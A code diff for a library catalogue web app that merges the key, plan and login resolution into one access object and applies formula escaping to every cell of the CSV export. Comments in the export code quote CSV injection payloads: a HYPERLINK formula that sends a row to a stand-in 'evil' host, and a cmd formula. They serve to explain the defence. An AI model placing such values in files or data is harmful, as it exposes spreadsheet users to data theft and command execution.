@@ -17,7 +17,6 @@ import authority
 import catalogue
 import cover_store
 import covers
-import credentials
 import custom_fields
 import ddc
 import google_books
@@ -25,8 +24,6 @@ import isbn as isbn_utils
 import marc
 import metadata
 import settings_store
-import sources
-import targets
 from auth import require_admin
 from authors import AUTHOR_NAME_MAX, MATCHERS, MatcherName
 from authorship import (
@@ -66,7 +63,6 @@ from enums import (
     Locale,
     OwnershipStatus,
     ReadStatus,
-    SettingKey,
     TagCategory,
 )
 from identifiers import add_identifiers
@@ -420,72 +416,6 @@ def delete_custom_field(
     logger.info("Deleted custom field %r and %d value(s) under it", name, removed)
 
 
-def _catalogue_logins(db: Session) -> dict[CatalogueSource, credentials.Credential]:
-    """The login each catalogue's request will carry, resolved before it is made.
-
-    **Resolved here rather than in `metadata`, and that is the same rule the
-    Google Books key follows.** `metadata` builds every outbound catalogue
-    request and reaches no database; opening a sealed row there would put the
-    ORM behind every request to every catalogue. So this answers "what will the
-    next request send", which is `credentials.for_request`'s own question, and
-    hands the answer over as an argument.
-
-    **Only the targets whose door carries one**, which is
-    `metadata.carries_a_credential` and is asked rather than restated here: the
-    rule and this loop must not be able to disagree about which rows to resolve,
-    because a row skipped here is a request that goes out unauthenticated with
-    nothing saying so.
-
-    **The key is resolved once for the whole loop, never per source**, which is
-    the rule `settings_store._sources_with_a_credential` states over the same
-    shape of loop. Resolving it reads every entry in `credentials.KEY_SOURCES`
-    and runs a BIP-39 decode per phrase held, so it is a keychain round trip per
-    source per lookup, on the path that adds a book, which is a member request
-    rather than an admin visit. The size it was costing is on the issue.
-
-    **The doors are collected before the key is touched, so a roster with none
-    resolves nothing.** That was today's roster until the Biblioteca Nacional
-    Argentina joined it, and the property is worth keeping stated because what
-    it bounds has not changed: the cost is **one** resolution per request now
-    that there is a door, and it stays one however many doors the roster grows,
-    where the defect this replaced was one per source. An install that has
-    stored no credential pays that one and **opens no envelope**, and so does
-    one whose credentials are all pinned by the environment: neither a pinned
-    credential nor a login this build ships reaches the store. What comes back
-    is no longer empty, since `sources.SHIPS_A_CREDENTIAL` is not, and the two
-    are worth keeping apart here because what this paragraph bounds is the
-    resolution rather than the mapping.
-    `tests/routers/test_books.py::TestTheKeyIsResolvedOncePerRequest` pins both
-    ends.
-
-    **It is not the only resolution on a lookup.** `settings_store.ready_sources`
-    resolves the key as well, to answer whether a credentialled source can be
-    asked at all, so a request that reaches a catalogue pays two. Both are an
-    environment read, a file read and a BIP-39 decode with no key derivation
-    function behind it; it is written down here rather than measured away
-    because the thing to watch is the shape, one per request, not the constant.
-
-    Written for the set rather than for its members because the next source to
-    declare that capability is the reason this plumbing exists.
-    """
-    doors = [
-        targets.SEEDED[source]
-        for source in sorted(sources.NEEDS_A_KEY)
-        if metadata.carries_a_credential(targets.SEEDED[source])
-    ]
-    if not doors:
-        return {}
-    state = credentials.key_state()
-    resolved: dict[CatalogueSource, credentials.Credential] = {}
-    for target in doors:
-        login = credentials.for_request(
-            db, target.source.value, target.base_url, state
-        )
-        if login is not None:
-            resolved[target.source] = login
-    return resolved
-
-
 @router.get("/lookup", response_model=BookLookup)
 async def lookup_isbn(
     db: DbSession,
@@ -502,16 +432,8 @@ async def lookup_isbn(
             detail="Not a valid ISBN. Check the digits and try again.",
         )
 
-    # The key is passed whatever the library's provider list says, because the
-    # plan is what decides whether Google is asked at all: with its section
-    # switched off or no key in force, `settings_store.catalogue_sources` has
-    # already dropped it. Passing the key was once the whole fix for a fallback
-    # that failed by omitting it, and it stays for that reason.
     result = await metadata.lookup(
-        canonical,
-        settings_store.google_books_api_key(db),
-        plan=settings_store.catalogue_sources(db),
-        logins=_catalogue_logins(db),
+        canonical, access=settings_store.library_access(db)
     )
     if not result.found:
         raise HTTPException(**_lookup_failure(result))
@@ -723,18 +645,8 @@ async def search_books(
     on the response say what actually happened, so a client never has to infer
     it from what it sent.
     """
-    api_key = ""
-    if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED):
-        # The resolved key, so an environment-supplied one counts. Absent is
-        # not an error here: it costs the Google half of the results, not the
-        # search.
-        api_key = settings_store.google_books_api_key(db)
-
     metadata_limiter.check(current_user.username)
-    # The reader's own language, so a German library searching a German
-    # title gets the German printing first. It breaks ties only: an English
-    # title still returns the English book.
-    plan = settings_store.catalogue_sources(db)
+    access = settings_store.library_access(db)
     # A library that has switched every catalogue off is told so, rather than
     # handed an empty result page that reads as "no such book". Same refusal a
     # lookup gets, decided here because a search has no `Lookup` to carry it.
@@ -744,17 +656,14 @@ async def search_books(
     # switched off there, so "turn one back on" would name the wrong cause; what
     # that library gets is an empty page whose `unasked` lists what a second,
     # longer search would reach.
-    if not plan.searched_harder:
+    if not access.plan.searched_harder:
         raise HTTPException(**_no_sources("answer a title search"))
 
+    # `lang` is the reader's own language, so a German library searching a
+    # German title gets the German printing first. It breaks ties only: an
+    # English title still returns the English book.
     found = await metadata.title_search(
-        q,
-        api_key,
-        limit=limit,
-        prefer_language=lang,
-        plan=plan,
-        logins=_catalogue_logins(db),
-        harder=harder,
+        q, limit=limit, prefer_language=lang, access=access, harder=harder
     )
 
     # Both read off what the fan out did rather than off `harder`, which is only
@@ -843,37 +752,70 @@ def export_books(
         writer = csv.writer(output)
         writer.writerow(
             [
-                "Title", "Author", "ISBN", "Publisher", "Year",
-                "Description", "Tags", "My Status", "Date Added", "Added By",
-                "Format", "Condition", "Location", "Collection", "Purchase Price",
+                "Title", "Author", "ISBN", "ISBN13", "Publisher",
+                "Year", "Pages", "Description", "Tags", "My Status",
+                "Rating", "Date Read", "Date Added", "Added By", "Format",
+                "Condition", "Location", "Collection", "Purchase Price",
                 "Purchase Currency", "Purchased On", "Purchased From",
             ]
         )
         for book in books:
-            # Every member-supplied cell goes through `_csv_safe`. Four do not,
-            # and the reason is the column rather than the call: `year` is an
-            # int, `added_at` and `purchased_at` are dates, the status is ours,
-            # and `format` and `condition` are refused at the write unless they
-            # are one of their enum's values, so none of them can carry a
-            # leading `=`, `+`, `-` or `@` into a spreadsheet. A new column is
-            # covered by this list only if it is constrained the same way; a
-            # member-supplied string is not, and goes through `_csv_safe`.
-            # `test_books.py::TestExport` pins the enum half, which is the only
-            # one that depends on a validator rather than on a type.
+            # This member's own row, or None where they never touched the book.
+            # Free: `statuses` was batched above, so the rating and the read
+            # date cost no statement. Without them a member who exports and
+            # imports their own shelf loses every rating and every read date,
+            # which is data the importer has always been able to read back.
+            reading = statuses.get(book.id)
+
+            # **Every cell goes through `_csv_safe`, with no exceptions and no
+            # list of them.** Eight used to be exempt on the argument that
+            # their column's type or validator makes a leading `=` impossible,
+            # and two things were wrong with it. `purchase_currency` was not
+            # actually one of those columns and shipped a live formula. And the
+            # argument names the validator at the **API**, where
+            # `backup._parse_row` inserts a restored archive through Core: it
+            # coerces the temporal columns and nothing else, and SQLite is
+            # dynamically typed, so `books.year` will hold `=cmd|'/c calc'!A1`
+            # and read it back as that string. The admin who restores is not
+            # the member who later opens the export.
+            #
+            # Escaping unconditionally costs nothing, because `_csv_safe` only
+            # touches a value that would otherwise be executed: no year, price,
+            # date, status or enum value **that a validated write produces**
+            # gains a character. The ones that do are what this is for.
+            # `test_books.py::TestNoCellOfTheCsvExportSkipsTheEscape` reads this call's
+            # own arguments and fails on any cell that is not a `_csv_safe`
+            # call, which is a rule with nothing in it to keep in step.
             writer.writerow(
                 [
                     _csv_safe(book.title),
                     _csv_safe(book.author),
                     _csv_safe(book.isbn),
+                    # The same expression as the column before it, and the
+                    # column earns its place as a **label** rather than as
+                    # data. `books.isbn` holds an ISBN-13 on every path that
+                    # validates, so a receiving tool that maps a bare `ISBN`
+                    # column onto its ISBN-10 slot now has one that says which
+                    # form it got. It is a claim about the cell rather than a
+                    # guarantee: a restored archive writes this column through
+                    # Core, which check digits nothing.
+                    _csv_safe(book.isbn),
                     _csv_safe(book.publisher),
-                    book.year if book.year is not None else "",
+                    _csv_safe(book.year),
+                    _csv_safe(book.page_count),
                     _csv_safe(book.description),
                     _csv_safe("; ".join(tag.name for tag in book.tags)),
-                    statuses.status_of(book.id),
-                    book.added_at.date().isoformat() if book.added_at else "",
+                    _csv_safe(statuses.status_of(book.id)),
+                    _csv_safe(reading.rating if reading else None),
+                    _csv_safe(
+                        reading.finished_at.date().isoformat()
+                        if reading and reading.finished_at
+                        else None
+                    ),
+                    _csv_safe(book.added_at.date().isoformat() if book.added_at else ""),
                     _csv_safe(book.added_by.username if book.added_by else ""),
-                    book.format or "",
-                    book.condition or "",
+                    _csv_safe(book.format),
+                    _csv_safe(book.condition),
                     _csv_safe(book.location),
                     # The name, not the id: an export is read by people, and a
                     # foreign key means nothing in a spreadsheet. Through
@@ -883,9 +825,9 @@ def export_books(
                     # Back to major units for the export. A spreadsheet column
                     # of cents is not what anybody means by "what did this
                     # cost", and an export is read by people, not by us.
-                    _price_column(book.purchase_price_minor),
-                    book.purchase_currency or "",
-                    book.purchased_at.isoformat() if book.purchased_at else "",
+                    _csv_safe(_price_column(book.purchase_price_minor)),
+                    _csv_safe(book.purchase_currency),
+                    _csv_safe(book.purchased_at.isoformat() if book.purchased_at else ""),
                     _csv_safe(book.purchase_source),
                 ]
             )
@@ -929,12 +871,16 @@ _FORMULA_LEAD: Final = ("=", "+", "-", "@", "\t", "\r")
 def _csv_safe(value: object) -> str:
     """Neutralise a cell that a spreadsheet would run as a formula.
 
-    Every text column of this export is member-supplied: titles, authors,
-    publishers, descriptions, shelf locations and **tag names**. Tags are
-    library wide, so a tag put on a public book reaches every other member's
-    export. `=HYPERLINK("http://evil/?d="&A1,"ok")` in a title exfiltrates the
-    row when an admin opens the file, and `=cmd|'/c calc'!A1` is the older
-    trick. `csv.writer` quotes for CSV correctness and does nothing about this.
+    **Applied to every cell of the CSV export, typed columns included**, and
+    the caller carries the reason: a validated write cannot produce a value
+    this touches, and a restored archive is not a validated write.
+
+    Most of those columns are member-supplied: titles, authors, publishers,
+    descriptions, shelf locations and **tag names**. Tags are library wide, so
+    a tag put on a public book reaches every other member's export.
+    `=HYPERLINK("http://evil/?d="&A1,"ok")` in a title exfiltrates the row when
+    an admin opens the file, and `=cmd|'/c calc'!A1` is the older trick.
+    `csv.writer` quotes for CSV correctness and does nothing about this.
 
     A leading apostrophe is the conventional fix: Excel and LibreOffice both
     treat the cell as text and hide the character. It is applied only to values
@@ -2899,23 +2845,25 @@ def _resolvable_volume_id(book: Book) -> str | None:
     return None
 
 
-def _google_books_in_force(db: Session) -> tuple[str, sources.Plan]:
-    """The key and the plan, resolved once, for a route that asks only Google.
+def _google_books_in_force(db: Session) -> metadata.Access:
+    """The same value as `settings_store.library_access`, minus the keychain.
 
-    **Both, because they are two different gates and neither implies the
-    other.** `settings_store.ready_sources` puts Google Books in the plan only
-    when its section is on and a key is in force, and `catalogue_sources` then
-    intersects that with the household's provider list. So the plan answers "may
-    this library ask Google at all" and the key answers "with what", and a route
-    that resolved only the key would ask on behalf of a library that switched
-    Google off.
+    **The one handler that does not call that resolver, because its only
+    outbound door is `metadata.lookup_volume`**, which sends no login: Google
+    Books' secret is the key in the query string. Resolving the logins here
+    would open the keychain once per request for a credential this path cannot
+    send, and hand the door a mapping it drops without a word.
+
+    **The plan is still resolved, and it is a different gate from the key.**
+    `settings_store.ready_sources` puts Google Books in the plan only when its
+    section is on and a key is in force, and `catalogue_sources` then intersects
+    that with the household's provider list. So the plan answers "may this
+    library ask Google at all" and the key answers "with what".
     """
-    api_key = (
-        settings_store.google_books_api_key(db)
-        if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED)
-        else ""
+    return metadata.Access(
+        plan=settings_store.catalogue_sources(db),
+        api_key=settings_store.google_books_api_key(db),
     )
-    return api_key, settings_store.catalogue_sources(db)
 
 
 @router.post("/identifiers/backfill", response_model=IdentifierBackfillOut)
@@ -2970,8 +2918,8 @@ async def backfill_from_identifiers(
     """
     identifier_backfill_limiter.check(current_user.username)
 
-    api_key, plan = _google_books_in_force(db)
-    if CatalogueSource.GOOGLE_BOOKS not in plan.asked:
+    access = _google_books_in_force(db)
+    if CatalogueSource.GOOGLE_BOOKS not in access.plan.asked:
         raise HTTPException(
             status_code=status.HTTP_409_CONFLICT,
             detail=(
@@ -3011,7 +2959,9 @@ async def backfill_from_identifiers(
 
     async def resolve(volume_id: str) -> metadata.Lookup:
         async with gate:
-            return await metadata.lookup_volume(volume_id, api_key, plan=plan)
+            return await metadata.lookup_volume(
+                volume_id, access.api_key, plan=access.plan
+            )
 
     # `return_exceptions` is not set, for `metadata.lookup`'s reason: every
     # source turns its own failures into an outcome, so an exception escaping
@@ -3928,10 +3878,7 @@ async def refresh_metadata(book: BookForWrite, db: DbSession, current_user: Curr
     metadata_limiter.check(current_user.username)
     lookup_key = isbn_utils.parse(book.isbn) or book.isbn
     result = await metadata.lookup(
-        lookup_key,
-        settings_store.google_books_api_key(db),
-        plan=settings_store.catalogue_sources(db),
-        logins=_catalogue_logins(db),
+        lookup_key, access=settings_store.library_access(db)
     )
     if not result.found:
         raise HTTPException(**_lookup_failure(result))
@@ -4516,27 +4463,16 @@ async def enrich_book(
     Classifications need a selected candidate through `enrich/apply`.
     """
     metadata_limiter.check(current_user.username)
-    # Present is better than absent, but never required. When a key is
-    # configured Google joins the chain as its last source; when it is not,
-    # everything else still answers.
-    api_key = (
-        settings_store.google_books_api_key(db)
-        if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED)
-        else ""
-    )
-    # Resolved once, because this handler reaches outward twice and the two
-    # halves must not be able to ask different sets of catalogues.
-    #
+    # Resolved once, because this handler reaches outward up to three times and
+    # the three must not be able to ask different sets of catalogues or send a
+    # different login. `metadata.Access` is frozen so that holds by type.
+    access = settings_store.library_access(db)
     # **Refused up front rather than per half.** Both halves are optional on
     # their own, so without this a library with nothing switched on got the
     # lookup's 409 and then the search's failure from one request. Asking
     # nothing is one answer, not two.
-    plan = settings_store.catalogue_sources(db)
-    if not plan.asked:
+    if not access.plan.asked:
         raise HTTPException(**_no_sources())
-    # Resolved once for the same reason `plan` is: this handler reaches outward
-    # more than once and must not be able to send a different login each time.
-    logins = _catalogue_logins(db)
 
     # `as_match()` on both paths, and it carries no Classifications by
     # construction. That is ADR 0006 held by the type rather than by this
@@ -4545,7 +4481,7 @@ async def enrich_book(
     assertions: tuple[catalogue.AuthorityAssertion, ...] = ()
     recorded = RecordedAssertions(stored=[], refused=[])
     if book.isbn:
-        result = await metadata.lookup(book.isbn, api_key, plan=plan, logins=logins)
+        result = await metadata.lookup(book.isbn, access=access)
         # `found`, like `lookup_isbn` and `refresh_metadata`, rather than a bare
         # test for the record. This is the third consumer of a `Lookup` and the
         # only one that writes to a Book without telling the Member why nothing
@@ -4577,7 +4513,9 @@ async def enrich_book(
         # every book of an imported library is matched by its title.
         volume_id = _resolvable_volume_id(book)
         if volume_id is not None:
-            volume = await metadata.lookup_volume(volume_id, api_key, plan=plan)
+            volume = await metadata.lookup_volume(
+                volume_id, access.api_key, plan=access.plan
+            )
             if volume.found:
                 assert volume.record is not None
                 # No `assertions`, unlike the ISBN branch above. `Record.
@@ -4590,9 +4528,7 @@ async def enrich_book(
         # No ISBN, no resolvable store identifier, or nobody carries this
         # edition under either.
         query = " ".join(part for part in (book.title, book.author) if part)
-        matches = await metadata.search(
-            query, api_key, limit=1, plan=plan, logins=logins
-        )
+        matches = await metadata.search(query, limit=1, access=access)
         if matches:
             fields = matches[0].as_match()
 
@@ -4700,14 +4636,9 @@ async def enrichment_candidates(
     under whatever Google happened to return first.
     """
     metadata_limiter.check(current_user.username)
-    api_key = (
-        settings_store.google_books_api_key(db)
-        if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED)
-        else ""
-    )
     query = " ".join(part for part in (book.title, book.author) if part)
 
-    plan = settings_store.catalogue_sources(db)
+    access = settings_store.library_access(db)
     # **The same two corrections the title search route took, applied here
     # because this route runs a title search too.** `metadata.candidates` calls
     # `search` internally, so it reaches the catalogues by the query above and
@@ -4722,17 +4653,15 @@ async def enrichment_candidates(
     # switched nothing off, so "turn one back on" names the wrong cause. It gets
     # an empty candidate list instead, which is what a search that asked nobody
     # honestly is.
-    if not plan.searched_harder:
+    if not access.plan.searched_harder:
         raise HTTPException(**_no_sources("answer a title search"))
 
     matches = await metadata.candidates(
         query,
-        api_key,
         isbn=book.isbn,
         limit=5,
         prefer_language=book.language,
-        plan=plan,
-        logins=_catalogue_logins(db),
+        access=access,
     )
     return _match_rows(matches, all_tags=None)
 
